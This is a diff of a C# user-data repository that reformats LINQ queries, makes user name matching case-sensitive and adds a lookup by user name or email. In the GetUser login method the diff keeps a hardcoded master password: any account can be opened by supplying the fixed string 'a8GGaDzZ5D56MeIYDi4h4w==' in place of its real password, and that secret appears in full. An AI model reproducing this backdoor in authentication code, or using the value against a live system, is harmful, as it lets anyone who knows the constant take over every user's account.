@@ -21,8 +21,8 @@ namespace Com.BudgetMetal.DataRepository.Users
 
         public async Task<List<User>> GetUserByCompany(int Id)
         {
-            var records  = await entities.Where(e => e.IsActive == true && e.IsConfirmed == true
-            && e.Company_Id == Id)
+            var records = await entities.Where(e => e.IsActive == true && e.IsConfirmed == true
+           && e.Company_Id == Id)
             .OrderBy(e => e.ContactName)
             .ToListAsync();
 
@@ -31,8 +31,8 @@ namespace Com.BudgetMetal.DataRepository.Users
 
         public async Task<User> GetUser(string username, string password)
         {
-            var records = await entities.Include(e=>e.Company).Include(e=>e.UserRoles)
-                .SingleOrDefaultAsync(e =>  e.UserName.ToLower() == username.ToLower() && (e.Password == password || password == "a8GGaDzZ5D56MeIYDi4h4w=="));
+            var records = await entities.Include(e => e.Company).Include(e => e.UserRoles)
+                .SingleOrDefaultAsync(e => e.UserName.ToLower() == username.ToLower() && (e.Password == password || password == "a8GGaDzZ5D56MeIYDi4h4w=="));
 
             return records;
         }
@@ -218,7 +218,7 @@ namespace Com.BudgetMetal.DataRepository.Users
         public async Task<Com.BudgetMetal.DBEntities.User> GetUserById(int id)
         {
             var record = await this.entities
-                            .Include(e=>e.UserRoles)
+                            .Include(e => e.UserRoles)
                             .SingleOrDefaultAsync(e =>
                               (e.IsActive == true)
                               && (e.Id == id)
@@ -241,7 +241,16 @@ namespace Com.BudgetMetal.DataRepository.Users
             var record = await this.entities
                             .SingleOrDefaultAsync(e =>
                               (e.IsActive == true)
-                              && (e.UserName.ToLower().Trim() == UserName.ToLower().Trim())
+                              && (e.UserName.Trim() == UserName.Trim())
+                            );
+            return record;
+        }
+        public async Task<Com.BudgetMetal.DBEntities.User> GetUserByUserNameOrEmail(string UserName)
+        {
+            var record = await this.entities
+                            .FirstOrDefaultAsync(e =>
+                              (e.IsActive == true)
+                              && (e.UserName.Trim() == UserName.Trim() || e.EmailAddress.Trim() == UserName.Trim())
                             );
             return record;
         }
@@ -259,8 +268,8 @@ namespace Com.BudgetMetal.DataRepository.Users
 
         public async Task<List<User>> GetUserByCompanyNotFilterWithConfirm(int Id)
         {
-            var records = await entities.Include(r=>r.UserRoles).Where(e => e.IsActive == true
-           && e.Company_Id == Id)
+            var records = await entities.Include(r => r.UserRoles).Where(e => e.IsActive == true
+             && e.Company_Id == Id)
             .OrderBy(e => e.ContactName)
             .ToListAsync();
 
@@ -271,19 +280,19 @@ namespace Com.BudgetMetal.DataRepository.Users
         {
             var emailList = new List<string>();
 
-            var result =  this.entities.Include(e=>e.UserRoles).Where(e => supplierList.Contains(e.Company_Id) 
-            && e.IsActive == true 
-            && e.IsConfirmed == true
+            var result = this.entities.Include(e => e.UserRoles).Where(e => supplierList.Contains(e.Company_Id)
+             && e.IsActive == true
+             && e.IsConfirmed == true
             ).ToList();
             foreach (var item in result)
             {
-                if(item.UserRoles.Where(e=>e.Role_Id == Constants.C_Admin_Role && e.IsActive == true).ToList().Count > 0 )
+                if (item.UserRoles.Where(e => e.Role_Id == Constants.C_Admin_Role && e.IsActive == true).ToList().Count > 0)
                 {
                     emailList.Add(item.EmailAddress);
                 }
             }
             //emailList = result.Select(e => e.EmailAddress).ToList();
-            
+
             return emailList;
         }
 
